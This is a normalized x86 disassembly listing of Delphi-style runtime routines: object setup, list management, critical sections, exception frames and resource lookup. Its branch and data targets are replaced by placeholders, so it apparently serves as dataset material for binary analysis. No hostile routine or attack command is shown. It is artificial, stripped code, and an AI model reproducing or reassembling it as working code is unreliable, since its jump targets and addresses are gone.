sub_416dec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_416d8c
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_416d8c
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403388
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_416e5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403144
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_41814c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_416ed8
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
mov eax [ esi + 0x4 ]
call sub_403174
mov eax [ esi + 0x8 ]
call sub_403174
mov eax [ esi + 0xc ]
call sub_403174
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_416f18
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_4182a8
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4030d8
test al al
jne r-xdata
sub_416f78
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_4182a8
mov edx eax
mov eax ebp
call sub_403388
test al al
jne r-xdata
sub_416fbc
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_417057
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4030c4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404150
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_416f18
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41814c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41705e
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b804
call sub_403928
sub_41707c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405110
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_41709c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_4182a8
mov edx edi
call sub_41707c
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_4182a8
mov edx edi
call sub_41707c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_418198
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_41707c
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_418198
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_417140
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_4182a8
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_416f78
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_41718c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403144
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416e5c
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_41814c
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_417200
push ebx
push esi
push edi
push ebp
call sub_403528
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_403510
mov eax [ esi + 0x4 ]
mov edx edi
call sub_4182a8
call sub_403174
inc edi
dec ebp
jne r-xdata
sub_41725c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_4182a8
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_416dec
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_4172a0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_416f18
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_4182a8
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_4172e4
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_417367
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4030c4
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41736e
lea eax [ ebp - 0x10c ]
call sub_403eec
retn
sub_417374
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41725c
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_416d80
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_4172e4
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_4182a8
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4182a8
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403388
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_41725c
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418198
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_41814c
sub_417460
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4182a8
mov edx ebp
call sub_417064
test al al
jne r-xdata
sub_4174a4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_416e5c
mov edx eax
mov eax [ edi + 0x4 ]
call sub_41814c
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4182a8
mov eax [ eax + 0xc ]
mov edx ebp
call sub_418304
test eax eax
jge r-xdata
sub_417500
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4182a8
mov esi eax
mov edx ebp
mov eax esi
call sub_41709c
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403174
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_418198
sub_417550
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403144
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov eax [ rw-data ]
call sub_41743c
xor eax eax
push ebp
push sub_41764f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc esi
xor edi edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417656
mov eax [ rw-data ]
call sub_4174f4
retn
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41814c
inc esi
xor edi edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4182a8
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_416f78
test al al
je r-xdata
inc edi
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
call sub_41814c
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx edi
call sub_4182a8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
je r-xdata
sub_417656
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_41767c
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_4176ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
call sub_41743c
xor edx edx
push ebp
push sub_417723
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4174f4
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
call sub_4039d4
jmp r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_4182a8
mov edx [ ebp - 0x4 ]
call sub_416f18
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_417740
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4177a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c1c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b748
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4177a7
lea eax [ ebp - 0xc ]
call sub_403eec
retn
sub_4177ac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41743c
xor eax eax
push ebp
push sub_4177f2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4172a0
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4177f9
mov eax [ rw-data ]
call sub_4174f4
retn
sub_417800
push ebx
push esi
mov esi eax
mov eax esi
call sub_4177ac
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax esi
call sub_417740
sub_417820
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41743c
xor eax eax
push ebp
push sub_417885
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417460
test al al
je r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_417448
cmp ebx [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41788c
mov eax [ rw-data ]
call sub_4174f4
retn
mov eax ebx
call sub_403100
mov ebx eax
sub_417890
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41743c
xor eax eax
push ebp
push sub_4178d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_417500
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4178d9
mov eax [ rw-data ]
call sub_4174f4
retn
sub_4178dc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41743c
xor eax eax
push ebp
push sub_41791e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ rw-data ]
call sub_4174a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417925
mov eax [ rw-data ]
call sub_4174f4
retn
sub_417928
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
call sub_41743c
xor eax eax
push ebp
push sub_41796f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ rw-data ]
call sub_417374
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417976
mov eax [ rw-data ]
call sub_4174f4
retn
sub_41797c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
mov eax [ rw-data ]
call sub_41743c
xor eax eax
push ebp
push sub_4179ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ rw-data ]
call sub_417140
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4179d1
mov eax [ rw-data ]
call sub_4174f4
retn
sub_417a30
push ebp
mov ebp esp
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
pop ebp
retn 0x8
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_417a68
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_417a30
mov edx eax
mov eax [ rw-data ]
call sub_4188b0
pop edi
pop esi
pop ebx
retn
sub_417a94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418938
mov esi eax
xor edx edx
push ebp
push sub_417afe
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41899c
retn
mov edx ebx
mov eax esi
call sub_4182a8
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0xc ]
mov [ ebp - 0x4 ] eax
call sub_4039d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417b10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418938
mov esi eax
xor edx edx
push ebp
push sub_417b7a
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41899c
retn
mov edx ebx
mov eax esi
call sub_4182a8
cmp edi [ eax + 0x4 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_4039d4
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_417b8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
xor eax eax
inc esi
lea ebx [ ecx + 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov al 0x1
mov edx [ ebp - 0x4 ]
mov ecx [ ebx - 0x4 ]
mov [ edx ] ecx
jmp r-xdata
mov edx edi
mov eax [ ebx ]
call sub_407db4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_417bcc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov [ ebp - 0x5 ] 0x0
inc esi
mov ebx [ ebp - 0x4 ]
add ebx 0x8
dec esi
jne r-xdata
mov [ ebp - 0x5 ] 0x1
mov eax edi
mov edx [ ebx + 0x4 ]
call sub_403f40
jmp r-xdata
cmp eax [ ebx ]
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_417c10
push ebx
push esi
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov esi ebx
mov edx esi
mov eax [ rw-data ]
call sub_418304
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov edx esi
mov eax [ rw-data ]
call sub_41814c
sub_417c68
push ebx
push esi
push edi
mov esi eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ebx [ edx + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_4182a8
mov edi eax
mov eax esi
call edi
test eax eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_417ca8
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_417c68
test eax eax
sete al
pop ebx
retn
mov eax ebx
call [ rw-data ]
pop ebx
retn
sub_417ccc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
test ebx ebx
jne r-xdata
push 0xa
mov eax edi
call sub_4043ac
push eax
push ebx
call FindResourceA
test eax eax
setne al
test al al
je r-xdata
mov ebx [ rw-data ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push edi
push 0xa
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b354
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_417d40
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi ]
mov eax [ ebp - 0x4 ]
call sub_41ae54
mov [ esi ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403174
retn
sub_417d50
push ebx
call sub_405e88
mov ebx [ eax + 0xc ]
test ebx ebx
jne r-xdata
call sub_405e88
mov edx [ eax + 0x8 ]
mov eax ebx
call sub_41814c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov ebx eax
call sub_405e88
mov [ eax + 0x8 ] ebx
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov ebx eax
call sub_405e88
mov [ eax + 0xc ] ebx
sub_417da8
push ebx
push esi
push edi
call sub_405e88
mov edi [ eax + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4182a8
mov edx [ eax ]
call [ edx + 0xc ]
inc esi
dec ebx
jne r-xdata
sub_417dd8
push ebx
push esi
call sub_405e88
mov eax [ eax + 0x8 ]
call sub_403174
call sub_405e88
mov ebx [ eax + 0xc ]
mov eax ebx
call sub_418390
mov esi eax
call sub_405e88
mov [ eax + 0x8 ] esi
mov edx [ ebx + 0x8 ]
dec edx
mov eax ebx
call sub_418198
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
call sub_405e88
xor edx edx
mov [ eax + 0xc ] edx
mov eax ebx
call sub_403174
sub_417e34
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
xor edx edx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_417eca
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
cmp esi [ r-xdata ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417ed1
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax [ ebp + 0x8 ]
cmp esi [ eax - 0x8 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax esi
call sub_403100
call sub_417e34
pop ecx
mov ebx eax
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4030c4
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404150
mov eax [ ebp - 0x4 ]
push eax
mov eax esi
call sub_405138
call sub_405188
mov edx eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x4 ]
pop eax
call sub_417ccc
or bl al
sub_417edc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_417f8a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
sete [ ebp - 0xa ]
cmp [ ebp - 0xa ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_417f6b
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov eax [ ebp - 0x4 ]
call sub_4030bc
call sub_417e34
pop ecx
mov [ ebp - 0x9 ] al
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_417d50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_417f72
cmp [ ebp - 0xa ] 0x0
je r-xdata
call sub_417da8
retn
call sub_417dd8
sub_417fa0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
push 0x400
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b528
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1c ] ebx
xor eax eax
push ebp
push sub_417ffd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_41e6ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418004
mov eax [ ebp - 0x4 ]
call sub_403174
retn
sub_41800c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
